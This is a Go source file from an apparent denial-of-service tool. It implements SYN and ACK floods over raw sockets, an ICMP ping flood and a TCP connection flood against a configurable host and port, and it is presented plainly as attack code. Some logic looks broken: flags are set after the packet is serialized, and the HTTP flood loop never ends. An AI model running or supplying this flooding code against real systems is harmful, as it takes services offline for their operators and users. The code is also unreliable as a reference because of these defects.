package attack

import (
	"fmt"
	"log"
	"net"
	"strconv"

	"github.com/go-ping/ping"
	"github.com/google/gopacket"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/layers"
	"golang.org/x/net/ipv4"
)

type DDOS struct {
	Host             string `json:"host"`
	Port             int16  `json:"port"`
	Packetbatchcount int64  `json:"packet_batch_count"`
	AttackType       string `json:"attack_type"`
}

func (a *DDOS) TCPAttack() {
	defer util.Run()()

	var srcIP, dstIP net.IP
	var srcIPstr string = "127.0.0.1"
	var dstIPstr string = a.Host

	srcIP = net.ParseIP(srcIPstr)
	if srcIP == nil {
		log.Printf("non-ip target: %q\n", srcIPstr)
	}
	srcIP = srcIP.To4()
	if srcIP == nil {
		log.Printf("non-ipv4 target: %q\n", srcIPstr)
	}

	dstIP = net.ParseIP(dstIPstr)
	if dstIP == nil {
		log.Printf("non-ip target: %q\n", dstIPstr)
	}
	dstIP = dstIP.To4()
	if dstIP == nil {
		log.Printf("non-ipv4 target: %q\n", dstIPstr)
	}

	ip := layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
	}

	srcport := layers.TCPPort(666)
	dstport := layers.TCPPort(a.Port)
	tcp := layers.TCP{
		SrcPort: srcport,
		DstPort: dstport,
		Window:  1505,
		Urgent:  0,
		Seq:     11050,
		Ack:     0,
		ACK:     false,
		SYN:     false,
		FIN:     false,
		RST:     false,
		URG:     false,
		ECE:     false,
		CWR:     false,
		NS:      false,
		PSH:     false,
	}

	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	tcp.SetNetworkLayerForChecksum(&ip)

	ipHeaderBuf := gopacket.NewSerializeBuffer()
	err := ip.SerializeTo(ipHeaderBuf, opts)
	if err != nil {
		log.Println("Error while serializing data")
	}
	ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
	if err != nil {
		log.Println("Error while parsing header")
	}

	tcpPayloadBuf := gopacket.NewSerializeBuffer()
	payload := gopacket.Payload([]byte("hola"))
	err = gopacket.SerializeLayers(tcpPayloadBuf, opts, &tcp, payload)
	if err != nil {
		log.Println("Error while serializing data")
	}

	var packetConn net.PacketConn
	var rawConn *ipv4.RawConn
	packetConn, err = net.ListenPacket("ip4:tcp", "localhost")
	if err != nil {
		log.Println("Error while listening for connection " + err.Error())
	}
	rawConn, err = ipv4.NewRawConn(packetConn)
	if err != nil {
		log.Println("Error while sending raw packet")
	}
	if a.AttackType == "1" {
		tcp.SYN = true
		// SYN Flood -> 1
	} else if a.AttackType == "2" {
		tcp.ACK = true
		// ACK Flood -> 2
	}
	for j := 0; j < int(a.Packetbatchcount); j++ {
		for i := 0; i < 1000; i++ {
			err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil)
			if err != nil {
				log.Println("Error while sending data " + err.Error())
			}
		}
	}
}

func (a *DDOS) ICMPAttack() {
	// ICMP Flood -> 3
	totalPackets := 100 * a.Packetbatchcount
	for totalPackets > 0 {
		pinger, err := ping.NewPinger(a.Host)
		if err != nil {
			log.Println("Error while creating pinger object " + err.Error())
		}
		pinger.Count = 100
		err = pinger.Run()
		if err != nil {
			log.Println("Error while executing ICMP Flood attack " + err.Error())
		}
		statistics := pinger.Statistics()
		fmt.Println(statistics)
		totalPackets = totalPackets - 100
	}
}

func (a *DDOS) HttpFlood() {
	//Http Flood -> 4
	totalPackets := a.Packetbatchcount * 100
	target := a.Host + ":" + strconv.Itoa(int(a.Port))
	for totalPackets > 0 {
		con, err := net.Dial("tcp", target)
		if err != nil {
			log.Println("Http request failed " + err.Error())
		}
		con.Close()
	}
}
